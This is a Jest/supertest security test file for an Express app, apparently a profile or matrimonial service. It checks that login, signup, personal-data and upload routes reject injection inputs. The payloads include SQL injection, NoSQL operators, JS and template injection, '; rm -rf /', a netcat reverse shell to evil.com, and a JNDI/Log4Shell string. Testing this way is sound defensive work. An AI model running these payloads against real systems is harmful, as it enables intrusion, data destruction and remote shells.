import request from 'supertest';
import express from 'express';
import authRouter from '../../routes/authRouter';
import userPersonalRouter from '../../routes/userPersonal';
import { createTestUser } from '../helpers/testUtils';
import jwt from 'jsonwebtoken';

const app = express();
app.use(express.json());
app.use('/auth', authRouter);
app.use('/user-personal', userPersonalRouter);

describe('SQL/NoSQL Injection Security Tests', () => {
  let testUser: any;
  let validToken: string;

  beforeEach(async () => {
    testUser = await createTestUser({
      email: 'test@example.com',
      role: 'user'
    });
    validToken = jwt.sign(
      { id: testUser._id, email: testUser.email },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );
  });

  describe('SQL Injection Attacks', () => {
    test('should prevent SQL injection in login email field', async () => {
      const sqlInjectionPayloads = [
        "admin@example.com'; DROP TABLE users; --",
        "admin@example.com' OR '1'='1",
        "admin@example.com'; UPDATE users SET role='admin' WHERE email='test@example.com'; --",
        "admin@example.com' UNION SELECT * FROM admin_users; --",
        "admin@example.com'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'admin'); --",
        "admin@example.com' OR 1=1 LIMIT 1; --",
        "admin@example.com'; EXEC xp_cmdshell('dir'); --",
        "admin@example.com' AND (SELECT COUNT(*) FROM users) > 0; --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: payload, password: 'password123' });
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      }
    });

    test('should prevent SQL injection in password fields', async () => {
      const sqlPasswordPayloads = [
        "password123' OR '1'='1",
        "password123'; DROP TABLE users; --",
        "password123' UNION SELECT password FROM admin_users; --",
        "password123'; UPDATE users SET password='hacked'; --",
      ];

      for (const payload of sqlPasswordPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: 'test@example.com', password: payload });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent SQL injection in reset password token', async () => {
      const sqlTokenPayloads = [
        "validtoken'; DROP TABLE users; --",
        "validtoken' OR '1'='1",
        "validtoken'; UPDATE users SET role='admin'; --",
        "validtoken' UNION SELECT * FROM sensitive_data; --",
      ];

      for (const token of sqlTokenPayloads) {
        const response = await request(app)
          .post(`/auth/reset-password/${encodeURIComponent(token)}`)
          .send({ password: 'NewPassword123!' });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent SQL injection in user personal data', async () => {
      const sqlDataPayloads = [
        "'; DROP TABLE user_personal; --",
        "'; UPDATE user_personal SET height='hacked'; --",
        "' UNION SELECT * FROM admin_data; --",
        "'; INSERT INTO admin_users (email) VALUES ('hacker@evil.com'); --",
      ];

      for (const payload of sqlDataPayloads) {
        const response = await request(app)
          .post('/user-personal')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            height: payload,
            weight: payload,
            astrologicalSign: payload,
            birthPlace: payload,
            religion: payload,
            marriedStatus: 'Never Married',
            nationality: payload,
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('NoSQL Injection Attacks', () => {
    test('should prevent NoSQL injection in authentication', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
        { $gt: '' },
        { $exists: true },
        { $in: ['admin@example.com', 'test@example.com'] },
        { $or: [{ email: 'admin@example.com' }, { role: 'admin' }] },
        { $and: [{ $where: 'this.role === "admin"' }] },
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: payload, password: 'password123' });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent NoSQL injection through query operators in password', async () => {
      const noSqlPasswordPayloads = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'return true' },
        { $exists: true },
        { $type: 'string' },
        { $size: 0 },
        { $all: [] },
      ];

      for (const payload of noSqlPasswordPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: 'test@example.com', password: payload });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent NoSQL injection in user data queries', async () => {
      const noSqlInjections = {
        height: { $ne: null },
        weight: { $regex: '.*admin.*' },
        religion: { $where: 'this.role === "admin"' },
        birthPlace: { $exists: true },
        astrologicalSign: { $in: ['admin', 'root'] },
        nationality: { $or: [{ role: 'admin' }] },
      };

      const response = await request(app)
        .post('/user-personal')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          ...noSqlInjections,
          marriedStatus: 'Never Married',
        });
      
      expect(response.status).toBe(400);
    });

    test('should prevent NoSQL injection in nested object fields', async () => {
      const nestedInjection = {
        height: '180cm',
        weight: '70kg',
        astrologicalSign: 'Leo',
        birthPlace: 'Test City',
        religion: 'Test Religion',
        marriedStatus: 'Never Married',
        nationality: 'Test Nation',
        full_address: {
          city: { $ne: null },
          state: { $regex: '.*' },
          zipCode: { $where: 'this.role === "admin"' },
          isYourHome: { $exists: true },
        },
      };

      const response = await request(app)
        .post('/user-personal')
        .set('Authorization', `Bearer ${validToken}`)
        .send(nestedInjection);
      
      expect(response.status).toBe(400);
    });

    test('should prevent NoSQL injection in array fields', async () => {
      const arrayInjection = {
        userId: testUser._id.toString(),
        age: { from: 25, to: 35 },
        maritalStatus: { "Never Married": true },
        isConsumeAlcoholic: 'no',
        educationLevel: 'Graduate',
        community: [
          { $ne: null },
          { $regex: '.*admin.*' },
          { $where: 'this.role === "admin"' },
        ],
        livingInCountry: 'India',
        livingInState: 'Maharashtra',
        profession: [
          { $exists: true },
          { $in: ['admin', 'root'] },
        ],
        diet: [
          { $or: [{ role: 'admin' }] },
          { $and: [{ admin: true }] },
        ],
      };

      const response = await request(app)
        .post('/user-personal/expectations')
        .set('Authorization', `Bearer ${validToken}`)
        .send(arrayInjection);
      
      expect(response.status).toBe(400);
    });

    test('should prevent NoSQL injection through aggregation operators', async () => {
      const aggregationPayloads = [
        { $match: { role: 'admin' } },
        { $group: { _id: '$role' } },
        { $project: { password: 1 } },
        { $lookup: { from: 'admin_users' } },
        { $unwind: '$sensitive_data' },
        { $facet: { admin: [{ $match: { role: 'admin' } }] } },
      ];

      for (const payload of aggregationPayloads) {
        const response = await request(app)
          .post('/user-personal/family')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            fatherName: payload,
            motherName: 'Test Mother',
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('JavaScript Injection Attacks', () => {
    test('should prevent JavaScript injection in user fields', async () => {
      const jsInjectionPayloads = [
        "'; return true; //",
        "'; process.exit(); //",
        "'; require('fs').readFile('/etc/passwd'); //",
        "'; global.admin = true; //",
        "'; this.role = 'admin'; //",
        "function(){return true}",
        "() => true",
        "${jndi:ldap://evil.com/x}",
      ];

      for (const payload of jsInjectionPayloads) {
        const response = await request(app)
          .post('/user-personal')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            height: '180cm',
            weight: '70kg',
            astrologicalSign: payload,
            birthPlace: payload,
            religion: payload,
            marriedStatus: 'Never Married',
            nationality: 'Test Nation',
          });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent server-side JavaScript injection', async () => {
      const serverSidePayloads = [
        "'; var fs = require('fs'); fs.readFileSync('/etc/passwd'); //",
        "'; process.env.NODE_ENV = 'development'; //",
        "'; require('child_process').exec('ls'); //",
        "'; global.Buffer.from('admin').toString(); //",
      ];

      for (const payload of serverSidePayloads) {
        const response = await request(app)
          .post('/user-personal/health')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            medicalHistoryDetails: payload,
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Template Injection Attacks', () => {
    test('should prevent template injection in text fields', async () => {
      const templateInjectionPayloads = [
        "{{constructor.constructor('return process')().env}}",
        "${7*7}",
        "#{7*7}",
        "<%=7*7%>",
        "{{config.items()}}",
        "{%for item in config%}{%endfor%}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
      ];

      for (const payload of templateInjectionPayloads) {
        const response = await request(app)
          .post('/auth/signup')
          .send({
            firstName: payload,
            lastName: 'Test',
            email: 'test@example.com',
            password: 'Password123!',
            phoneNumber: '+1234567890',
            gender: 'male',
            dateOfBirth: '01-01-1990',
            for_Profile: 'myself',
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('LDAP Injection Attacks', () => {
    test('should prevent LDAP injection in authentication fields', async () => {
      const ldapInjectionPayloads = [
        "admin@example.com)(|(uid=*))",
        "admin@example.com)(&(uid=admin)",
        "admin@example.com)(cn=*)",
        "*)(uid=*))(|(uid=*",
        "admin@example.com)(!(&(uid=admin)))",
      ];

      for (const payload of ldapInjectionPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: payload, password: 'password123' });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('XPath Injection Attacks', () => {
    test('should prevent XPath injection in search fields', async () => {
      const xpathInjectionPayloads = [
        "' or '1'='1",
        "'] | //user/role[text()='admin' | ['",
        "'] | //password | ['",
        "' or name()='password' or '1'='1",
        "'] | //* | ['",
      ];

      for (const payload of xpathInjectionPayloads) {
        const response = await request(app)
          .post('/user-personal/family')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            fatherName: payload,
            motherName: 'Test Mother',
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Command Injection Attacks', () => {
    test('should prevent OS command injection in file-related operations', async () => {
      const cmdInjectionPayloads = [
        "; cat /etc/passwd",
        "| whoami",
        "&& ls -la",
        "; rm -rf /",
        "` ls `",
        "$(whoami)",
        "; nc evil.com 4444 -e /bin/sh",
      ];

      for (const payload of cmdInjectionPayloads) {
        const response = await request(app)
          .post('/user-personal/upload/photos')
          .set('Authorization', `Bearer ${validToken}`)
          .field('filename', payload)
          .attach('file', Buffer.from('test'), payload);
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent command injection through environment manipulation', async () => {
      const envInjectionPayloads = [
        "test; export MALICIOUS=evil; #",
        "test && echo $PATH",
        "test; env | grep -i pass",
        "test; history",
      ];

      for (const payload of envInjectionPayloads) {
        const response = await request(app)
          .put('/user-personal')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            height: '180cm',
            weight: '70kg',
            astrologicalSign: 'Leo',
            birthPlace: payload,
            religion: 'Test Religion',
            marriedStatus: 'Never Married',
            nationality: 'Test Nation',
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Code Injection Prevention', () => {
    test('should prevent eval() injection attempts', async () => {
      const evalPayloads = [
        "eval('process.exit()')",
        "Function('return process')().exit()",
        "setTimeout('process.exit()', 0)",
        "setInterval('console.log(process.env)', 0)",
        "new Function('return this.process')().exit()",
      ];

      for (const payload of evalPayloads) {
        const response = await request(app)
          .post('/user-personal/profession')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            userId: testUser._id.toString(),
            Occupation: payload,
            OrganizationName: 'Test Org',
          });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent serialization attacks', async () => {
      const serializationPayloads = [
        'O:8:"stdClass":1:{s:4:"code";s:20:"system(\'whoami\');";}',
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4',
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
      ];

      for (const payload of serializationPayloads) {
        const response = await request(app)
          .post('/user-personal/education')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            userId: testUser._id.toString(),
            SchoolName: payload,
            HighestEducation: 'Graduate',
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Buffer Overflow Prevention', () => {
    test('should handle extremely long input strings', async () => {
      const longString = 'A'.repeat(100000);
      
      const response = await request(app)
        .post('/auth/signup')
        .send({
          firstName: longString,
          lastName: longString,
          email: 'test@example.com',
          password: 'Password123!',
          phoneNumber: '+1234567890',
          gender: 'male',
          dateOfBirth: '01-01-1990',
          for_Profile: 'myself',
        });
      
      expect(response.status).toBe(400);
    });

    test('should prevent buffer overflow in nested objects', async () => {
      const maliciousData = {
        height: '180cm',
        weight: '70kg',
        astrologicalSign: 'Leo',
        birthPlace: 'Test City',
        religion: 'Test Religion',
        marriedStatus: 'Never Married',
        nationality: 'Test Nation',
        full_address: {
          city: 'A'.repeat(50000),
          state: 'B'.repeat(50000),
          zipCode: 'C'.repeat(50000),
        },
      };

      const response = await request(app)
        .post('/user-personal')
        .set('Authorization', `Bearer ${validToken}`)
        .send(maliciousData);
      
      expect(response.status).toBe(400);
    });
  });

  describe('Format String Attacks', () => {
    test('should prevent format string injection', async () => {
      const formatStringPayloads = [
        '%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s',
        '%n%n%n%n%n%n%n%n%n%n',
        '%x%x%x%x%x%x%x%x%x%x',
        '%.1000000s',
        '%*.*s',
      ];

      for (const payload of formatStringPayloads) {
        const response = await request(app)
          .post('/user-personal/health')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            medicalHistoryDetails: payload,
          });
        
        expect(response.status).toBe(400);
      }
    });
  });
});